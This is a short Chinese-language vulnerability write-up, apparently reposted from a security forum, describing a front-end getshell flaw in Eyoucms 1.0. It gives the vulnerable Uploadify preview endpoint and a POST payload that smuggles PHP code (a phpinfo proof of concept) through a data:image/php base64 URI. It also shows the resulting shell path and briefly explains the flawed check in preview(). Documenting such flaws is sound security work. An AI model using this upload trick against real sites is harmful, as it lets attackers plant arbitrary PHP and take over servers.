# Eyoucms 1.0 前台getshell

> 原文：[https://www.zhihuifly.com/t/topic/2916](https://www.zhihuifly.com/t/topic/2916)

# Eyoucms 1.0 前台getshell

## 一、漏洞简介

官网：http://www.eyoucms.com/download/
Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip

## 二、漏洞影响

## 三、复现过程

老样子：先讲如何利用

```
url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview `构造: <?php phpinfo;` 
```

![image](img/7978445a5d92b706f233d6fd3375a930.png)

```
post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw== 
```

![image](img/3a80a5dd2a7640989aa2d16c0aee02ea.png)

Shell: http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php

![image](img/0785e398fa077c95cb0cb3aa66611ad5.png)

![image](img/75cb99cdf9868ad96f977648b17b3cb9.png)

### 原理分析

漏洞文件： eyoucms1.0\application\api\controller\Uploadify.php
漏洞函数：preview()

![image](img/70c7a79ef0f1dbac9771e402db57c791.png)

![image](img/3e8f9a403b741846aba94538f7b11fc3.png)

这里我将每行有意义的代码都解释了一下帮助读者进行查看。

而我刚开始时也思考了一下，这会不会是作者故意搞的后门？
带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的 表示data:image/ 居然还可以不是图片？
好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/ 只能是图片。

## 四、参考链接

> https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh